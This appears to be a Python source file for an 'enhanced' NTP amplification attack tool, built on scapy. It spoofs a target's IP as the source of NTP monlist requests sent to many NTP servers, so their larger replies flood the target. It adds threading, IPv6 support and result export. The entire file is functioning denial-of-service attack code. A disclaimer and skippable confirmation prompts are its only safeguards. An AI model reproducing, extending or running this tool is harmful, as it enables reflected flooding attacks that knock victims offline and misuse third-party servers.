#!/usr/bin/env python3

"""
Enhanced NTP Amplification Attack Test Tool
===========================================

Enhanced version with progress indicators, JSON/CSV output, 
better CLI interface, and IPv6 support.

Original script by Ron Nilekani, modified by Vicente Manuel Munoz Milchorena
Further enhanced with modern Python practices and additional features.

This tool is for authorized penetration testing only.
"""

from scapy.all import *
import sys
import threading
import time
import argparse
import json
import csv
import ipaddress
import logging
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, asdict
import signal
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue

@dataclass
class AttackStats:
    """Statistics tracking for the attack session"""
    target: str
    start_time: datetime
    end_time: Optional[datetime] = None
    packets_sent: int = 0
    servers_used: int = 0
    errors: int = 0
    success_rate: float = 0.0
    amplification_factor: float = 0.0
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for JSON output"""
        data = asdict(self)
        data['start_time'] = self.start_time.isoformat()
        if self.end_time:
            data['end_time'] = self.end_time.isoformat()
            data['duration_seconds'] = (self.end_time - self.start_time).total_seconds()
        return data

class NTPAmplificationTool:
    """Enhanced NTP Amplification Testing Tool"""
    
    def __init__(self):
        self.logger = self._setup_logging()
        self.stats = None
        self.running = True
        self.progress_bar = None
        self.results_queue = queue.Queue()
        
        # Register signal handlers for graceful shutdown
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    def _setup_logging(self) -> logging.Logger:
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('ntp_amplification.log'),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)
    
    def _signal_handler(self, signum, frame):
        """Handle graceful shutdown on SIGINT/SIGTERM"""
        self.logger.info("Received shutdown signal, stopping gracefully...")
        self.running = False
        if self.progress_bar:
            self.progress_bar.close()
        sys.exit(0)
    
    def validate_ip_address(self, ip_str: str) -> bool:
        """Validate IPv4 or IPv6 address"""
        try:
            ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False
    
    def load_ntp_servers(self, filepath: str) -> List[str]:
        """Load and validate NTP servers from file"""
        try:
            servers = []
            with open(filepath, 'r') as file:
                for line_num, line in enumerate(file, 1):
                    server = line.strip()
                    if server and not server.startswith('#'):  # Skip comments
                        if self.validate_ip_address(server):
                            servers.append(server)
                        else:
                            self.logger.warning(f"Invalid IP address on line {line_num}: {server}")
            
            self.logger.info(f"Loaded {len(servers)} valid NTP servers")
            return servers
            
        except FileNotFoundError:
            self.logger.error(f"File not found: {filepath}")
            sys.exit(1)
        except Exception as e:
            self.logger.error(f"Error reading file {filepath}: {e}")
            sys.exit(1)
    
    def create_ntp_packet(self, ntp_server: str, target_address: str, sport: int = 51147) -> IP:
        """Create NTP amplification packet with IPv4/IPv6 support"""
        # NTP v2 Monlist pattern
        ntp_data_pattern = b"\x17\x00\x03\x2a" + b"\x00" * 4
        
        try:
            # Determine if we're dealing with IPv6
            target_ip = ipaddress.ip_address(target_address)
            server_ip = ipaddress.ip_address(ntp_server)
            
            if isinstance(target_ip, ipaddress.IPv6Address) or isinstance(server_ip, ipaddress.IPv6Address):
                # IPv6 packet
                packet = IPv6(dst=ntp_server, src=target_address) / UDP(sport=sport, dport=123) / Raw(load=ntp_data_pattern)
            else:
                # IPv4 packet
                packet = IP(dst=ntp_server, src=target_address) / UDP(sport=sport, dport=123) / Raw(load=ntp_data_pattern)
            
            return packet
            
        except Exception as e:
            self.logger.error(f"Error creating packet for {ntp_server}: {e}")
            return None
    
    def send_ntp_packet(self, ntp_server: str, target_address: str, packet_count: int = 1) -> Dict[str, Any]:
        """Send NTP amplification packets to a single server"""
        result = {
            'server': ntp_server,
            'packets_sent': 0,
            'success': False,
            'error': None,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            if not self.running:
                return result
            
            packet = self.create_ntp_packet(ntp_server, target_address)
            if packet is None:
                result['error'] = "Failed to create packet"
                return result
            
            # Send packets
            for _ in range(packet_count):
                if not self.running:
                    break
                    
                send(packet, verbose=False)
                result['packets_sent'] += 1
                self.stats.packets_sent += 1
                
                # Small delay to prevent overwhelming
                time.sleep(0.01)
            
            result['success'] = True
            self.logger.debug(f"Sent {result['packets_sent']} packets to {ntp_server}")
            
        except Exception as e:
            result['error'] = str(e)
            self.stats.errors += 1
            self.logger.error(f"Error sending to {ntp_server}: {e}")
        
        return result
    
    def run_attack(self, target: str, servers: List[str], threads: int = 10, 
                   packets_per_server: int = 1, delay: float = 0.1) -> List[Dict[str, Any]]:
        """Run the NTP amplification attack with progress tracking"""
        
        # Initialize statistics
        self.stats = AttackStats(target=target, start_time=datetime.now(), servers_used=len(servers))
        
        self.logger.info(f"Starting NTP amplification test against {target}")
        self.logger.info(f"Using {len(servers)} NTP servers with {threads} threads")
        
        results = []
        
        # Create progress bar
        self.progress_bar = tqdm(
            total=len(servers),
            desc="Attacking servers",
            unit="server",
            ncols=100
        )
        
        try:
            # Use ThreadPoolExecutor for better thread management
            with ThreadPoolExecutor(max_workers=threads) as executor:
                # Submit all tasks
                future_to_server = {
                    executor.submit(self.send_ntp_packet, server, target, packets_per_server): server
                    for server in servers
                }
                
                # Process completed tasks
                for future in as_completed(future_to_server):
                    if not self.running:
                        break
                        
                    server = future_to_server[future]
                    try:
                        result = future.result()
                        results.append(result)
                        
                        # Update progress
                        self.progress_bar.update(1)
                        self.progress_bar.set_postfix({
                            'Sent': self.stats.packets_sent,
                            'Errors': self.stats.errors
                        })
                        
                        # Add delay between servers if specified
                        if delay > 0:
                            time.sleep(delay)
                            
                    except Exception as e:
                        self.logger.error(f"Task for server {server} failed: {e}")
                        self.stats.errors += 1
        
        finally:
            self.progress_bar.close()
            self.stats.end_time = datetime.now()
            
            # Calculate success rate
            successful = sum(1 for r in results if r['success'])
            self.stats.success_rate = (successful / len(results)) * 100 if results else 0
            
            self.logger.info(f"Attack completed. Sent {self.stats.packets_sent} packets to {len(results)} servers")
            self.logger.info(f"Success rate: {self.stats.success_rate:.1f}%")
        
        return results
    
    def save_results_json(self, results: List[Dict[str, Any]], filename: str):
        """Save results to JSON file"""
        output_data = {
            'statistics': self.stats.to_dict(),
            'results': results
        }
        
        with open(filename, 'w') as f:
            json.dump(output_data, f, indent=2, default=str)
        
        self.logger.info(f"Results saved to {filename}")
    
    def save_results_csv(self, results: List[Dict[str, Any]], filename: str):
        """Save results to CSV file"""
        if not results:
            self.logger.warning("No results to save to CSV")
            return
        
        with open(filename, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=results[0].keys())
            writer.writeheader()
            writer.writerows(results)
        
        self.logger.info(f"Results saved to {filename}")
    
    def print_summary(self, results: List[Dict[str, Any]]):
        """Print attack summary to console"""
        if not results:
            return
        
        successful = [r for r in results if r['success']]
        failed = [r for r in results if not r['success']]
        
        print("\n" + "="*60)
        print("ATTACK SUMMARY")
        print("="*60)
        print(f"Target: {self.stats.target}")
        print(f"Duration: {(self.stats.end_time - self.stats.start_time).total_seconds():.2f} seconds")
        print(f"Total packets sent: {self.stats.packets_sent}")
        print(f"Servers contacted: {len(results)}")
        print(f"Successful: {len(successful)} ({self.stats.success_rate:.1f}%)")
        print(f"Failed: {len(failed)}")
        print(f"Errors: {self.stats.errors}")
        
        if failed:
            print(f"\nFailed servers:")
            for result in failed[:5]:  # Show first 5 failures
                print(f"  - {result['server']}: {result.get('error', 'Unknown error')}")
            if len(failed) > 5:
                print(f"  ... and {len(failed) - 5} more")

def main():
    """Main function with enhanced CLI"""
    parser = argparse.ArgumentParser(
        description="Enhanced NTP Amplification Attack Test Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t 192.168.1.100 -f ntp_servers.txt
  %(prog)s -t 2001:db8::1 -f ntp_servers.txt --threads 20 --packets 5
  %(prog)s -t 10.0.0.1 -f servers.txt --json results.json --csv results.csv
        """
    )
    
    # Required arguments
    parser.add_argument('-t', '--target', required=True,
                       help='Target IP address (IPv4 or IPv6)')
    parser.add_argument('-f', '--file', required=True,
                       help='File containing NTP server addresses')
    
    # Optional arguments
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of concurrent threads (default: 10)')
    parser.add_argument('--packets', type=int, default=1,
                       help='Packets per server (default: 1)')
    parser.add_argument('--delay', type=float, default=0.1,
                       help='Delay between servers in seconds (default: 0.1)')
    
    # Output options
    parser.add_argument('--json', type=str,
                       help='Save results to JSON file')
    parser.add_argument('--csv', type=str,
                       help='Save results to CSV file')
    parser.add_argument('--quiet', action='store_true',
                       help='Suppress progress output')
    
    # Safety options
    parser.add_argument('--force', action='store_true',
                       help='Skip confirmation prompts')
    parser.add_argument('--max-servers', type=int, default=100,
                       help='Maximum number of servers to use (default: 100)')
    
    args = parser.parse_args()
    
    # Initialize tool
    tool = NTPAmplificationTool()
    
    # Validate target IP
    if not tool.validate_ip_address(args.target):
        tool.logger.error(f"Invalid target IP address: {args.target}")
        sys.exit(1)
    
    # Load servers
    servers = tool.load_ntp_servers(args.file)
    if not servers:
        tool.logger.error("No valid servers found in file")
        sys.exit(1)
    
    # Safety check for large server lists
    if len(servers) > args.max_servers:
        if not args.force:
            response = input(f"You're about to use {len(servers)} servers (max: {args.max_servers}). Continue? [y/N]: ")
            if response.lower() not in ['y', 'yes']:
                print("Aborted by user")
                sys.exit(0)
        servers = servers[:args.max_servers]
        tool.logger.warning(f"Limited to first {args.max_servers} servers")
    
    # Final confirmation
    if not args.force:
        print(f"\nTarget: {args.target}")
        print(f"Servers: {len(servers)}")
        print(f"Threads: {args.threads}")
        print(f"Packets per server: {args.packets}")
        
        response = input("\nProceed with attack? [y/N]: ")
        if response.lower() not in ['y', 'yes']:
            print("Aborted by user")
            sys.exit(0)
    
    # Run attack
    print(f"\nStarting attack in 3 seconds... (Ctrl+C to abort)")
    for i in range(3, 0, -1):
        print(f"Starting in {i}...")
        time.sleep(1)
    
    results = tool.run_attack(
        target=args.target,
        servers=servers,
        threads=args.threads,
        packets_per_server=args.packets,
        delay=args.delay
    )
    
    # Save results
    if args.json:
        tool.save_results_json(results, args.json)
    
    if args.csv:
        tool.save_results_csv(results, args.csv)
    
    # Print summary
    if not args.quiet:
        tool.print_summary(results)

if __name__ == "__main__":
    main()
